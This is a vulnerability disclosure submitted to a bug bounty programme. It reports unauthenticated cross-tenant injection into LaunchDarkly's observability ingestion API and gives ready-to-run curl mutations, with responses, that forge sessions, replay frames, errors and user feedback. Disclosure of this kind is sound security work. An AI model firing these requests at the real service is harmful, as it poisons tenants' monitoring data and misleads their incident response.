# SUBMISSION 2 — Unauthenticated cross-tenant injection into LaunchDarkly Observability (Session Replay / Error Monitoring): four verified mutations create forged sessions, fake replay frames, fake errors and fake end-user feedback in any tenant, keyed only on client-supplied identifiers

- **Platform:** Bugcrowd — LaunchDarkly (`launchdarkly-mbb-og`)
- **Hunter:** zeno0
- **Asset:** LaunchDarkly Observability public ingestion API — `pub.observability.app.ld.catamorphic.com` (backend of the Observability product surfaced by in-scope `app.launchdarkly.com`; the shared workspace identifier is served by the in-scope app bootstrap)
- **Suggested VRT:** Broken Access Control, Cross-Tenant Access (or Server Security Issue → Manipulable Data) → P3
- **Tested:** 2026-10-23 → 2026-10-24 (multiple re-verifications)

---

## Title

**Unauthenticated cross-tenant Session Replay injection: attacker-controlled `organization_verbose_id`/`session_secure_id` GraphQL arguments (no auth, no CSRF, attacker-chosen Origin) let anyone forge sessions, replay frames, error events and user feedback into the LaunchDarkly Observability product.**

---

## Summary

LaunchDarkly Observability (Session Replay / Error Monitoring) exposes its public ingestion GraphQL endpoint with **no authentication of any kind**. The tenant a write lands in is determined solely by client-supplied GraphQL arguments (`organization_verbose_id`, embedded in the client-generated `session_secure_id`). An attacker who knows — or guesses — a victim's observability project ID can:

1. **`initializeSession`** — create a forged session in the victim tenant (the server echoes the attacker-chosen `secure_id` back as canonical);
2. **`pushSessionEvents`** — inject fake error events (attacker-controlled message/type/url);
3. **`pushPayload`** — inject rrweb replay frames (attacker-controlled DOM content, network-capture records);
4. **`addSessionFeedback`** — inject fake end-user feedback carrying attacker-chosen user names and email addresses.

The read path is separately enforced (LDProjectAuth middleware) — **no cross-tenant data READ is claimed**; this is a write/integrity vulnerability in the program's stated focus area (cross-organization isolation, unauthorized data manipulation).

Aggravating context discovered during testing: **every LaunchDarkly customer org maps to the SAME `observabilityProjectID` (`1jdkoe52`) and `clientSideId`** in the `app.launchdarkly.com` bootstrap (`/internal/config/authenticated`, fetched under two unrelated sessions — both return identical values). Tenant separation of the product's write path therefore does not even require knowing a victim-specific ID; one constant workspace ID is shared by all customers, and the identifier is also disclosed unauthenticated via `/internal/config/anonymous`.

---

## Steps to reproduce (copy-paste)

All requests are plain HTTPS POSTs. No cookies, no tokens, no CSRF token, no signature. The `Origin` header is attacker-chosen and accepted.

### 1. Initialize a forged session (unauthenticated)

```bash
curl -s -X POST "https://pub.observability.app.ld.catamorphic.com/" \
  -H "Content-Type: application/json" \
  -H "Origin: https://app.launchdarkly.com" \
  -d '{
    "query": "mutation InitializeSession($secure_id: String!, $org: String!, $client_id: String!) { initializeSession(session_secure_id: $secure_id, session_key: \"\", organization_verbose_id: $org, enable_strict_privacy: false, enable_recording_network_contents: true, clientVersion: \"test-1.0.0\", firstloadVersion: \"test-1.0.0\", clientConfig: \"{}\", environment: \"production\", appVersion: \"1.0.0\", serviceName: \"superz-test\", fingerprint: \"superz-fp-123\", client_id: $client_id) { secure_id } }",
    "variables": {
      "secure_id": "1jdkoe52-sztest-22222222-2222-4222-8222-222222222222",
      "org": "1jdkoe52",
      "client_id": "1jdkoe52"
    }
  }'
# -> 200 {"data":{"initializeSession":{"secure_id":"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222"}}}
#    ^ the server ECHOED BACK the attacker-forged secure_id as canonical
```

### 2. Inject fake error events

```bash
curl -s -X POST "https://pub.observability.app.ld.catamorphic.com/" \
  -H "Content-Type: application/json" -H "Origin: https://app.launchdarkly.com" \
  -d '{"query":"mutation { pushSessionEvents(session_secure_id: \"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222\", payload_id: 1, data: \"[{\\\"type\\\":\\\"error\\\",\\\"message\\\":\\\"Payment gateway returned 500 for ALL customers\\\",\\\"url\\\":\\\"https://victim.example/checkout\\\"}]\") }"}'
# -> 200 {"data":{"pushSessionEvents":null}}
```

### 3. Inject fake session-replay frames (rrweb events)

```bash
curl -s -X POST "https://pub.observability.app.ld.catamorphic.com/" \
  -H "Content-Type: application/json" -H "Origin: https://app.launchdarkly.com" \
  -d '{"query":"mutation { pushPayload(session_secure_id: \"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222\", payload_id: 3, events: { events: [{ type: 4, timestamp: 1792673000.0, _sid: 0, data: { href: \"https://injected.example/admin\" } }] }, messages: \"{}\", resources: \"{\\\"requests\\\":[]}\", errors: [], has_session_unloaded: false, highlight_logs: \"[]\") }"}'
# -> 200 {"data":{"pushPayload":172}}
```

### 4. Inject fake end-user feedback (attacker-chosen name + email)

```bash
curl -s -X POST "https://pub.observability.app.ld.catamorphic.com/" \
  -H "Content-Type: application/json" -H "Origin: https://app.launchdarkly.com" \
  -d '{"query":"mutation { addSessionFeedback(session_secure_id: \"<attacker-initialized session id>\", verbatim: \"this feature breaks production for all our customers\", user_name: \"superz\", user_email: \"superz-r15@example.test\", timestamp: \"2026-10-24T12:00:00Z\") }"}'
# -> 200 {"data":{"addSessionFeedback":"<session id echoed>"}}
```

Introspection (open unauthenticated) documents the full surface: ~190 query fields, ingest mutation family (`initializeSession`, `pushSessionEvents`, `pushPayload`, `addSessionFeedback`, `identifySession(session_secure_id, user_identifier, user_object)` — same class, shape documented, not fired), plus OTLP ingestion at `otel.observability.app.ld.catamorphic.com/v1/logs|/v1/traces` which returns `200 {"partialSuccess":{}}` unauthenticated for any `highlight.project_id`.

## Why this is cross-tenant

- `organization_verbose_id` is a plain GraphQL argument supplied by the client. The public SDK source (`@launchdarkly/o11y` GraphQLClient) sends no auth token anywhere in the ingestion path.
- The session `secure_id` format is client-generated: `GenerateSecureID(`${organizationID}-${sessionKey}`)`.
- A victim's `observabilityProjectID` is embedded client-side in victim applications (not a secret) — and in LaunchDarkly's own deployment it is the **same constant (`1jdkoe52`) for every customer org**, additionally disclosed unauthenticated by the in-scope app (`/internal/config/anonymous`, 324 KB).
- Injected sessions/feedback/errors surface in the victim's Session Replay UI, error monitor, and feedback views during incident triage.

## Impact (honest scope)

- **Poisoned Session Replay data in victim tenants**: fake user sessions, fake replay frames (attacker-controlled DOM), fake network captures, fake identities (`identifySession`).
- **Fake errors → error-monitoring pollution → false alerts**, including wasted automated-investigation spend (Vega) and misleading data during incident response.
- **Fabricated end-user feedback** with attacker-chosen names/emails visible to the victim team — a social-engineering/triage-poisoning vector.
- **No cross-tenant data READ** is demonstrated or claimed: read queries are gated by `LDProjectAuth` (see negative controls).

## Negative controls (read side — verified NOT broken)

- `sessions(project_id, …)` unauthenticated → "LDProjectAuth requires LDAccountID in context" (enforced); also enforced for our authenticated LDSO session cookies in the latest test round.
- `session(secure_id)` via authenticated session → "record not found" for foreign sessions; project resolvers scope to the caller's account.
- `LDAccountID` is not client-controllable (six candidate header names all rejected).
- `event_chunk_url` enforces an access check ("access denied for action 'viewSession'"). Note: its error message leaks internal infrastructure (`http://varnish.ld.catamorphic.com:3081/internal/authorization/access-check/observability/bulk`) — informational, not part of the impact claim.
- Middleware-hardening note for triage: in our first test round an authenticated LDSO session reached per-field resolvers ("record not found"); in the latest round the same calls hard-gate on `LDAccountID`. The read side appears to have been tightened during the engagement window — the write side was not.

## Suggested remediation

1. Require a per-project ingest token (or signed session initialization) for all ingestion mutations — currently nothing authenticates the writer.
2. Derive `organization_verbose_id` from an authenticated context server-side instead of accepting it as a client argument.
3. Stop sharing one `observabilityProjectID` across all customer orgs; per-tenant workspace IDs at minimum.
4. Validate `Origin` against the project's registered origins (currently attacker-chosen Origins are accepted).
5. Remove the open introspection surface on the production ingestion endpoint.

## Notes for triage

- The ingestion host is the backend of the Observability product that `app.launchdarkly.com` (in scope) serves and configures; the shared workspace identifier and the endpoint hostnames are both disclosed by the in-scope app's own bootstrap responses. We submit it as belonging to the product surface of the in-scope asset.
- All injected test data was written only to the shared/LaunchDarkly-side workspace with clearly-marked researcher session IDs (`sz…` markers); no victim customer tenant was targeted during testing, and no read was attempted against any real session.
- Verified unauth mutation set: `initializeSession`, `pushSessionEvents`, `pushPayload`, `addSessionFeedback` (each reproduced with 200 + echo/payload counters).
